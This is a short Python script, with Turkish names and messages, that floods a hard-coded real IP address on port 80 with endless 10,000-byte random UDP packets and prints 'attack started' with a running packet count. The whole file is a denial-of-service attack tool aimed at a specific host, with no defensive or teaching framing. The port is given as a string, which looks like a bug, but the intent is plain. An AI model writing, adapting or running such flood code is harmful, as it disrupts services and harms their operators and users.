
import socket
import random
import os



hedef_ip="212.175.170.116"
hedef_port="80"

bytes=random._urandom(10000)
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

sayac=0
while True:
	sock.sendto(bytes,(hedef_ip,hedef_port))
	sayac=sayac+1
	print("saldiri baslatildi,gonderilen paket:%s"%(sayac))
